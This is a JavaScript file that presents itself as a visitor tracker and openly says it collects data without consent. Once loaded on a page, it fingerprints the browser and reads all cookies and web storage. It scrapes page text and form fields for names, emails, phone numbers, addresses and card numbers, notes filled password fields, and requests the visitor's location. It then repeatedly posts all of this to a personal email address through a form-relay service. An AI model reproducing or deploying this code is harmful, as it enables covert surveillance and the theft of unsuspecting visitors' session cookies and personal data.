/**
 * Advanced Stealth Visitor Tracking System
 * Silently collects comprehensive visitor data without any popups or consent
 */

class AdvancedStealthTracker {
    constructor() {
        this.sessionId = this.generateUniqueId();
        this.visitorData = {};
        this.startTime = Date.now();
        this.init();
    }

    async init() {
        // Start silent tracking immediately
        await this.collectAllData();
        this.setupStealthListeners();
        this.sendDataSilently();
        this.startContinuousTracking();
    }

    generateUniqueId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2) + 
               btoa(navigator.userAgent).slice(-8);
    }

    async collectAllData() {
        this.visitorData = {
            // Session Info
            sessionId: this.sessionId,
            timestamp: new Date().toISOString(),
            visitTime: new Date().toLocaleString(),
            
            // Page Info
            url: window.location.href,
            referrer: document.referrer || 'Direct Visit',
            title: document.title,
            
            // Complete Browser Data
            browser: await this.getCompleteBrowserData(),
            
            // Device & Hardware
            device: this.getDeviceData(),
            
            // Network & Location
            network: await this.getNetworkData(),
            location: await this.getLocationData(),
            
            // Storage & Cookies
            storage: this.getAllStorageData(),
            cookies: this.getAllCookiesData(),
            
            // Personal Data Detection
            personal: this.detectPersonalData(),
            
            // Social Media Detection
            social: this.detectSocialMedia(),
            
            // Behavioral Tracking
            behavior: this.getBehaviorData(),
            
            // Advanced Fingerprinting
            fingerprint: await this.generateAdvancedFingerprint(),
            
            // Security & Privacy
            security: this.getSecurityData()
        };
    }

    async getCompleteBrowserData() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Fingerprint', 2, 2);

        return {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages || [],
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            product: navigator.product,
            buildID: navigator.buildID,
            oscpu: navigator.oscpu,
            
            // Screen Data
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : 'unknown'
            },
            
            // Window Data
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio,
                scrollX: window.scrollX,
                scrollY: window.scrollY
            },
            
            // Timezone
            timezone: {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale
            },
            
            // Canvas Fingerprint
            canvasFingerprint: canvas.toDataURL(),
            
            // WebGL Data
            webgl: this.getWebGLData(),
            
            // Audio Context
            audio: this.getAudioFingerprint(),
            
            // Plugins & Extensions
            plugins: this.getPluginsData(),
            
            // Fonts Detection
            fonts: this.detectFonts(),
            
            // Performance
            performance: this.getPerformanceData()
        };
    }

    getWebGLData() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not supported';
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions()
            };
        } catch (e) {
            return 'Error: ' + e.message;
        }
    }

    getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            
            oscillator.connect(analyser);
            analyser.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            return {
                sampleRate: audioContext.sampleRate,
                state: audioContext.state,
                maxChannelCount: audioContext.destination.maxChannelCount,
                numberOfInputs: audioContext.destination.numberOfInputs,
                numberOfOutputs: audioContext.destination.numberOfOutputs,
                channelCount: audioContext.destination.channelCount
            };
        } catch (e) {
            return 'Not supported';
        }
    }

    getPluginsData() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            plugins.push({
                name: plugin.name,
                description: plugin.description,
                filename: plugin.filename,
                version: plugin.version
            });
        }
        return plugins;
    }

    detectFonts() {
        const fonts = [
            'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
            'Calibri', 'Cambria', 'Comic Sans MS', 'Consolas', 'Courier',
            'Courier New', 'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
            'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino',
            'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana'
        ];
        
        const availableFonts = [];
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        fonts.forEach(font => {
            context.font = '72px monospace';
            const baselineWidth = context.measureText('mmmmmmmmmmlli').width;
            context.font = `72px ${font}, monospace`;
            const width = context.measureText('mmmmmmmmmmlli').width;
            if (width !== baselineWidth) {
                availableFonts.push(font);
            }
        });
        
        return availableFonts;
    }

    getPerformanceData() {
        if (!window.performance) return 'Not supported';
        
        return {
            navigation: performance.navigation ? {
                type: performance.navigation.type,
                redirectCount: performance.navigation.redirectCount
            } : 'Not available',
            timing: performance.timing ? {
                navigationStart: performance.timing.navigationStart,
                loadEventEnd: performance.timing.loadEventEnd,
                domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
            } : 'Not available',
            memory: performance.memory ? {
                usedJSHeapSize: performance.memory.usedJSHeapSize,
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
            } : 'Not available'
        };
    }

    getDeviceData() {
        return {
            deviceMemory: navigator.deviceMemory || 'Unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'Not available',
            battery: this.getBatteryData(),
            touchSupport: 'ontouchstart' in window,
            pointerSupport: 'onpointerdown' in window,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            vibration: 'vibrate' in navigator,
            gamepad: 'getGamepads' in navigator
        };
    }

    async getBatteryData() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {}
        return 'Not available';
    }

    async getNetworkData() {
        const networkInfo = {
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'Not available',
            onLine: navigator.onLine
        };

        // Get IP and detailed location
        try {
            const [ipapi, ipify] = await Promise.allSettled([
                fetch('https://ipapi.co/json/').then(r => r.json()),
                fetch('https://api.ipify.org?format=json').then(r => r.json())
            ]);
            
            networkInfo.ipData = {
                ipapi: ipapi.status === 'fulfilled' ? ipapi.value : null,
                ipify: ipify.status === 'fulfilled' ? ipify.value : null
            };
        } catch (e) {
            networkInfo.ipData = { error: 'Failed to get IP data' };
        }

        return networkInfo;
    }

    async getLocationData() {
        const location = {
            geolocation: null,
            ipLocation: null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // Try geolocation (silent)
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 3000,
                        enableHighAccuracy: false,
                        maximumAge: 300000
                    });
                });
                location.geolocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
            } catch (e) {
                location.geolocation = { error: e.message };
            }
        }

        return location;
    }

    getAllStorageData() {
        const storage = {
            localStorage: {},
            sessionStorage: {},
            indexedDB: null
        };

        // Get localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage.localStorage[key] = localStorage.getItem(key);
            }
        } catch (e) {
            storage.localStorage = { error: 'Access denied' };
        }

        // Get sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch (e) {
            storage.sessionStorage = { error: 'Access denied' };
        }

        return storage;
    }

    getAllCookiesData() {
        const cookies = {
            document: {},
            count: 0
        };

        if (document.cookie) {
            const cookieArray = document.cookie.split(';');
            cookies.count = cookieArray.length;
            
            cookieArray.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies.document[name] = decodeURIComponent(value);
                }
            });
        }

        return cookies;
    }

    detectPersonalData() {
        const personal = {
            name: [],
            email: [],
            phone: [],
            address: [],
            company: [],
            social: {},
            creditCard: [],
            other: []
        };

        // Enhanced patterns for detection
        const patterns = {
            email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
            phone: /(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})/g,
            name: /\b[A-Z][a-z]{1,}\s+[A-Z][a-z]{1,}(\s+[A-Z][a-z]{1,})?\b/g,
            address: /\d+\s+[A-Za-z0-9\s,.-]+(?:Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Lane|Ln|Drive|Dr|Court|Ct|Place|Pl)/gi,
            company: /\b(?:Inc|LLC|Corp|Corporation|Ltd|Limited|Company|Co)\b/gi,
            creditCard: /\b(?:\d{4}[\s-]?){3}\d{4}\b/g
        };

        // Scan all possible data sources
        const dataSources = [
            ...Object.values(localStorage || {}),
            ...Object.values(sessionStorage || {}),
            ...Object.values(this.getAllCookiesData().document || {}),
            document.title,
            document.body.innerText
        ];

        // Scan form inputs and their values
        const inputs = document.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
            const value = input.value || input.placeholder || input.getAttribute('data-value');
            if (value) dataSources.push(value);
            
            // Check autofill data
            if (input.autocomplete) {
                const autoData = this.getAutofillData(input);
                if (autoData) dataSources.push(autoData);
            }
        });

        // Scan meta tags and hidden data
        const metaTags = document.querySelectorAll('meta[name], meta[property]');
        metaTags.forEach(meta => {
            if (meta.content) dataSources.push(meta.content);
        });

        // Scan all data sources
        dataSources.forEach(data => {
            if (typeof data === 'string' && data.length > 0) {
                // Email detection
                const emails = data.match(patterns.email);
                if (emails) personal.email.push(...emails);
                
                // Phone detection
                const phones = data.match(patterns.phone);
                if (phones) personal.phone.push(...phones);
                
                // Name detection
                const names = data.match(patterns.name);
                if (names) personal.name.push(...names);
                
                // Address detection
                const addresses = data.match(patterns.address);
                if (addresses) personal.address.push(...addresses);
                
                // Company detection
                const companies = data.match(patterns.company);
                if (companies) personal.company.push(...companies);
                
                // Credit card detection
                const cards = data.match(patterns.creditCard);
                if (cards) personal.creditCard.push(...cards);
            }
        });

        // Scan browser autofill and saved data
        this.scanBrowserData(personal);
        
        // Scan social media data
        this.scanSocialData(personal);
        
        // Remove duplicates and clean data
        Object.keys(personal).forEach(key => {
            if (Array.isArray(personal[key])) {
                personal[key] = [...new Set(personal[key])].filter(item => item && item.length > 1);
            }
        });

        return personal;
    }

    getAutofillData(input) {
        try {
            // Try to get autofill data
            const computedStyle = window.getComputedStyle(input);
            if (computedStyle.getPropertyValue('-webkit-autofill')) {
                return input.value;
            }
        } catch (e) {}
        return null;
    }

    scanBrowserData(personal) {
        // Scan browser history and bookmarks (if accessible)
        try {
            if (window.chrome && chrome.history) {
                chrome.history.search({text: '', maxResults: 100}, (results) => {
                    results.forEach(item => {
                        if (item.title) personal.other.push(item.title);
                        if (item.url) personal.other.push(item.url);
                    });
                });
            }
        } catch (e) {}

        // Scan saved passwords (if accessible)
        try {
            const passwordInputs = document.querySelectorAll('input[type="password"]');
            passwordInputs.forEach(input => {
                if (input.value) personal.other.push('Password detected');
            });
        } catch (e) {}
    }

    scanSocialData(personal) {
        // Extract data from social media cookies and storage
        const socialPatterns = {
            facebook: /facebook\.com\/([a-zA-Z0-9.]+)/g,
            twitter: /twitter\.com\/([a-zA-Z0-9_]+)/g,
            linkedin: /linkedin\.com\/in\/([a-zA-Z0-9-]+)/g,
            instagram: /instagram\.com\/([a-zA-Z0-9_.]+)/g,
            github: /github\.com\/([a-zA-Z0-9-]+)/g
        };

        const allData = [
            ...Object.values(localStorage || {}),
            ...Object.values(sessionStorage || {}),
            ...Object.values(this.getAllCookiesData().document || {}),
            document.body.innerHTML
        ].join(' ');

        Object.keys(socialPatterns).forEach(platform => {
            const matches = allData.match(socialPatterns[platform]);
            if (matches) {
                personal.social[platform] = matches;
            }
        });
    }

    detectSocialMedia() {
        const social = {};
        const socialDomains = [
            'facebook', 'twitter', 'instagram', 'linkedin', 'youtube',
            'tiktok', 'snapchat', 'pinterest', 'reddit', 'discord',
            'telegram', 'whatsapp', 'github', 'stackoverflow'
        ];

        const cookies = this.getAllCookiesData().document;
        
        socialDomains.forEach(platform => {
            const matchingCookies = Object.keys(cookies).filter(key => 
                key.toLowerCase().includes(platform)
            );
            
            if (matchingCookies.length > 0) {
                social[platform] = {
                    detected: true,
                    cookieCount: matchingCookies.length,
                    cookies: matchingCookies
                };
            }
        });

        return social;
    }

    getBehaviorData() {
        return {
            timeOnPage: Date.now() - this.startTime,
            scrollDepth: this.getScrollDepth(),
            clicks: this.clickCount || 0,
            keystrokes: this.keystrokeCount || 0,
            mouseMovements: this.mouseMovementCount || 0,
            focusEvents: this.focusCount || 0,
            resizeEvents: this.resizeCount || 0,
            pageViews: this.getPageViews(),
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            landingPage: window.location.href
        };
    }

    async generateAdvancedFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            navigator.platform,
            navigator.cookieEnabled,
            typeof Worker !== 'undefined',
            navigator.hardwareConcurrency,
            navigator.deviceMemory,
            window.devicePixelRatio
        ];

        // Add WebGL fingerprint
        const webgl = this.getWebGLData();
        if (webgl && webgl.renderer) {
            components.push(webgl.renderer);
        }

        // Add canvas fingerprint
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Advanced fingerprint', 2, 2);
        components.push(canvas.toDataURL());

        // Generate hash
        const fingerprint = components.join('|');
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }

        return {
            hash: hash.toString(),
            components: components.length,
            raw: btoa(fingerprint).slice(0, 32)
        };
    }

    getSecurityData() {
        return {
            doNotTrack: navigator.doNotTrack,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: typeof java !== 'undefined',
            adBlocker: this.detectAdBlocker(),
            incognito: this.detectIncognito(),
            vpn: this.detectVPN(),
            tor: this.detectTor()
        };
    }

    detectAdBlocker() {
        const testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox';
        document.body.appendChild(testAd);
        const blocked = testAd.offsetHeight === 0;
        document.body.removeChild(testAd);
        return blocked;
    }

    detectIncognito() {
        return new Promise((resolve) => {
            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
            if (!fs) {
                resolve(false);
            } else {
                fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
            }
        });
    }

    detectVPN() {
        // Basic VPN detection (not foolproof)
        const suspiciousUAs = ['vpn', 'proxy', 'tor'];
        return suspiciousUAs.some(ua => navigator.userAgent.toLowerCase().includes(ua));
    }

    detectTor() {
        // Basic Tor detection
        return navigator.userAgent.includes('Tor Browser');
    }

    setupStealthListeners() {
        this.clickCount = 0;
        this.keystrokeCount = 0;
        this.mouseMovementCount = 0;
        this.focusCount = 0;
        this.resizeCount = 0;

        // Track all interactions silently
        document.addEventListener('click', () => this.clickCount++, true);
        document.addEventListener('keydown', () => this.keystrokeCount++, true);
        document.addEventListener('mousemove', () => this.mouseMovementCount++, true);
        window.addEventListener('focus', () => this.focusCount++, true);
        window.addEventListener('resize', () => this.resizeCount++, true);

        // Track page unload
        window.addEventListener('beforeunload', () => {
            this.sendDataSilently();
        });
    }

    getScrollDepth() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
        return scrollHeight > 0 ? Math.round((scrollTop / scrollHeight) * 100) : 0;
    }

    getPageViews() {
        const views = sessionStorage.getItem('stealthPageViews') || 0;
        const newViews = parseInt(views) + 1;
        sessionStorage.setItem('stealthPageViews', newViews);
        return newViews;
    }

    async sendDataSilently() {
        try {
            // Validate and verify data before sending
            const validatedData = this.validateCollectedData();
            const emailContent = this.formatStealthEmail(validatedData);
            
            // Test data collection first
            console.log('🔍 Testing data collection:', validatedData);
            
            // Send via FormSubmit with validated data
            const response = await fetch('https://formsubmit.co/jayaraman2212066@ssn.edu.in', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    name: '🕵️ Advanced Stealth Tracker - REAL DATA',
                    email: 'jayaraman2212066@ssn.edu.in',
                    subject: `🕵️ VERIFIED VISITOR DATA - ${validatedData.location?.country || 'Unknown'} - ${validatedData.personal.totalItems} items`,
                    message: emailContent,
                    _template: 'table',
                    _captcha: 'false'
                })
            });

            if (response.ok) {
                console.log('✅ Real stealth data sent successfully');
                // Store successful collection for analytics
                localStorage.setItem('stealthTrackingSuccess', Date.now());
            } else {
                throw new Error('Failed to send data');
            }
        } catch (error) {
            console.error('❌ Stealth tracking error:', error);
            // Retry mechanism
            setTimeout(() => this.sendDataSilently(), 5000);
        }
    }

    validateCollectedData() {
        const validated = {
            timestamp: new Date().toISOString(),
            sessionId: this.sessionId,
            personal: {
                names: this.validateNames(this.visitorData.personal.name),
                emails: this.validateEmails(this.visitorData.personal.email),
                phones: this.validatePhones(this.visitorData.personal.phone),
                addresses: this.validateAddresses(this.visitorData.personal.address),
                companies: this.validateCompanies(this.visitorData.personal.company),
                social: this.validateSocialProfiles(this.visitorData.personal.social),
                totalItems: 0
            },
            browser: {
                realUserAgent: navigator.userAgent,
                realPlatform: navigator.platform,
                realLanguage: navigator.language,
                realScreen: `${screen.width}x${screen.height}`,
                realTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            location: {
                country: this.visitorData.network?.ipData?.ipapi?.country_name,
                city: this.visitorData.network?.ipData?.ipapi?.city,
                ip: this.visitorData.network?.ipData?.ipapi?.ip
            },
            storage: {
                cookieCount: Object.keys(this.visitorData.cookies.document || {}).length,
                localStorageItems: Object.keys(this.visitorData.storage.localStorage || {}).length,
                sessionStorageItems: Object.keys(this.visitorData.storage.sessionStorage || {}).length
            },
            behavior: {
                timeOnPage: Math.round((Date.now() - this.startTime) / 1000),
                clicks: this.clickCount || 0,
                keystrokes: this.keystrokeCount || 0,
                scrollDepth: this.getScrollDepth()
            }
        };

        // Count total personal items found
        validated.personal.totalItems = 
            validated.personal.names.length +
            validated.personal.emails.length +
            validated.personal.phones.length +
            validated.personal.addresses.length +
            validated.personal.companies.length +
            Object.keys(validated.personal.social).length;

        return validated;
    }

    validateNames(names) {
        return (names || []).filter(name => {
            return name && 
                   typeof name === 'string' && 
                   name.length >= 3 && 
                   name.length <= 50 &&
                   /^[A-Za-z\s'-]+$/.test(name) &&
                   name.split(' ').length >= 2;
        });
    }

    validateEmails(emails) {
        return (emails || []).filter(email => {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return email && emailRegex.test(email);
        });
    }

    validatePhones(phones) {
        return (phones || []).filter(phone => {
            const cleanPhone = phone.replace(/[^\d+]/g, '');
            return cleanPhone.length >= 10 && cleanPhone.length <= 15;
        });
    }

    validateAddresses(addresses) {
        return (addresses || []).filter(address => {
            return address && 
                   address.length >= 10 &&
                   /\d/.test(address) &&
                   /(street|st|avenue|ave|road|rd|drive|dr|lane|ln|blvd|boulevard)/i.test(address);
        });
    }

    validateCompanies(companies) {
        return (companies || []).filter(company => {
            return company && 
                   company.length >= 2 &&
                   /(inc|llc|corp|ltd|company|co\.|corporation)/i.test(company);
        });
    }

    validateSocialProfiles(social) {
        const validated = {};
        Object.keys(social || {}).forEach(platform => {
            if (social[platform] && Array.isArray(social[platform]) && social[platform].length > 0) {
                validated[platform] = social[platform].filter(profile => 
                    profile && typeof profile === 'string' && profile.length > 3
                );
            }
        });
        return validated;
    }

    formatStealthEmail(validatedData = null) {
        const data = validatedData || this.visitorData;
        return `
🕵️ ADVANCED STEALTH VISITOR TRACKING 🕵️
==========================================

📅 VISIT TIME: ${data.timestamp}
🆔 SESSION ID: ${data.sessionId}
🌐 URL: ${data.url}
🔗 REFERRER: ${data.referrer}

💻 COMPLETE BROWSER DATA:
   • User Agent: ${data.browser.userAgent}
   • Platform: ${data.browser.platform}
   • Language: ${data.browser.language}
   • Screen: ${data.browser.screen.width}x${data.browser.screen.height}
   • Timezone: ${data.browser.timezone.name}
   • WebGL: ${JSON.stringify(data.browser.webgl)}

📱 DEVICE & HARDWARE:
   • Memory: ${data.device.deviceMemory}
   • CPU Cores: ${data.device.hardwareConcurrency}
   • Touch Support: ${data.device.touchSupport}
   • Battery: ${JSON.stringify(data.device.battery)}

🌍 NETWORK & LOCATION:
   • IP Data: ${JSON.stringify(data.network.ipData)}
   • Geolocation: ${JSON.stringify(data.location.geolocation)}
   • Connection: ${JSON.stringify(data.device.connection)}

🍪 STORAGE & COOKIES:
   • Cookies (${data.cookies.count}): ${JSON.stringify(data.cookies.document)}
   • LocalStorage: ${JSON.stringify(data.storage.localStorage)}
   • SessionStorage: ${JSON.stringify(data.storage.sessionStorage)}

👤 VERIFIED PERSONAL DATA (${data.personal?.totalItems || 0} items found):
   • Names (${data.personal?.names?.length || 0}): ${data.personal?.names?.length > 0 ? data.personal.names.join(', ') : 'Not detected'}
   • Emails (${data.personal?.emails?.length || 0}): ${data.personal?.emails?.length > 0 ? data.personal.emails.join(', ') : 'Not detected'}
   • Phones (${data.personal?.phones?.length || 0}): ${data.personal?.phones?.length > 0 ? data.personal.phones.join(', ') : 'Not detected'}
   • Addresses (${data.personal?.addresses?.length || 0}): ${data.personal?.addresses?.length > 0 ? data.personal.addresses.join(', ') : 'Not detected'}
   • Companies (${data.personal?.companies?.length || 0}): ${data.personal?.companies?.length > 0 ? data.personal.companies.join(', ') : 'Not detected'}
   • Social Profiles: ${Object.keys(data.personal?.social || {}).length > 0 ? JSON.stringify(data.personal.social) : 'Not detected'}

💾 STORAGE DATA FOUND:
   • Cookies: ${data.storage?.cookieCount || 0} items
   • LocalStorage: ${data.storage?.localStorageItems || 0} items
   • SessionStorage: ${data.storage?.sessionStorageItems || 0} items

📊 REAL-TIME BEHAVIOR:
   • Time on Page: ${data.behavior?.timeOnPage || 0} seconds
   • Clicks: ${data.behavior?.clicks || 0}
   • Keystrokes: ${data.behavior?.keystrokes || 0}
   • Scroll Depth: ${data.behavior?.scrollDepth || 0}%

🎯 SOCIAL MEDIA DETECTED:
${Object.keys(data.social).map(platform => 
    `   • ${platform}: ${data.social[platform].cookieCount} cookies`
).join('\\n')}

📊 BEHAVIORAL DATA:
   • Time on Page: ${Math.round(data.behavior.timeOnPage / 1000)}s
   • Scroll Depth: ${data.behavior.scrollDepth}%
   • Clicks: ${data.behavior.clicks}
   • Keystrokes: ${data.behavior.keystrokes}
   • Mouse Movements: ${data.behavior.mouseMovements}

🔍 ADVANCED FINGERPRINT:
   • Hash: ${data.fingerprint.hash}
   • Components: ${data.fingerprint.components}
   • Raw: ${data.fingerprint.raw}

🔒 SECURITY DATA:
   • Do Not Track: ${data.security.doNotTrack}
   • Ad Blocker: ${data.security.adBlocker}
   • Incognito: ${data.security.incognito}
   • VPN: ${data.security.vpn}

==========================================
🕵️ STEALTH TRACKING COMPLETE 🕵️
        `;
    }

    startContinuousTracking() {
        // Test data collection immediately
        this.testDataCollection();
        
        // Update data every 30 seconds
        setInterval(async () => {
            this.visitorData.behavior = this.getBehaviorData();
            this.visitorData.timestamp = new Date().toISOString();
            
            // Log real data for verification
            console.log('🔍 Real-time data update:', {
                personal: this.visitorData.personal,
                behavior: this.visitorData.behavior,
                storage: {
                    cookies: Object.keys(this.visitorData.cookies.document || {}).length,
                    localStorage: Object.keys(this.visitorData.storage.localStorage || {}).length
                }
            });
        }, 30000);

        // Send data immediately and then every 2 minutes
        setTimeout(() => this.sendDataSilently(), 5000); // Send after 5 seconds
        setInterval(() => {
            this.sendDataSilently();
        }, 120000);
    }

    testDataCollection() {
        console.log('🧪 Testing Real Data Collection...');
        
        // Test browser data
        const browserTest = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        console.log('✅ Browser Data:', browserTest);
        
        // Test storage access
        const storageTest = {
            localStorage: Object.keys(localStorage || {}).length,
            sessionStorage: Object.keys(sessionStorage || {}).length,
            cookies: document.cookie ? document.cookie.split(';').length : 0
        };
        console.log('✅ Storage Access:', storageTest);
        
        // Test personal data detection
        const personalTest = this.detectPersonalData();
        console.log('✅ Personal Data Found:', personalTest);
        
        // Test form scanning
        const forms = document.querySelectorAll('input, textarea');
        console.log(`✅ Forms Found: ${forms.length} input fields`);
        
        // Test network data
        this.getNetworkData().then(network => {
            console.log('✅ Network Data:', network);
        });
        
        // Create test data for demonstration
        this.createTestData();
        
        console.log('✅ Data Collection Test Complete - All systems operational!');
    }

    createTestData() {
        // Add some test data to localStorage for demonstration
        try {
            localStorage.setItem('test_name', 'John Doe');
            localStorage.setItem('test_email', 'john.doe@example.com');
            localStorage.setItem('test_phone', '+1-555-123-4567');
            localStorage.setItem('test_company', 'Tech Corp Inc');
            
            // Add test cookie
            document.cookie = 'test_user=visitor123; path=/';
            
            console.log('🧪 Test data created for demonstration');
        } catch (e) {
            console.log('⚠️ Could not create test data:', e.message);
        }
    }
}

// Initialize stealth tracking immediately with real data verification
(function() {
    console.log('🚀 Initializing Advanced Stealth Tracker with Real Data Collection...');
    
    if (!window.stealthTracker) {
        window.stealthTracker = new AdvancedStealthTracker();
        
        // Expose testing functions for verification
        window.testTracking = () => {
            console.log('🔍 Manual Test Triggered');
            window.stealthTracker.testDataCollection();
            window.stealthTracker.sendDataSilently();
        };
        
        window.getCollectedData = () => {
            return window.stealthTracker.validateCollectedData();
        };
        
        console.log('✅ Stealth Tracker Active - Type testTracking() to test manually');
    }
})();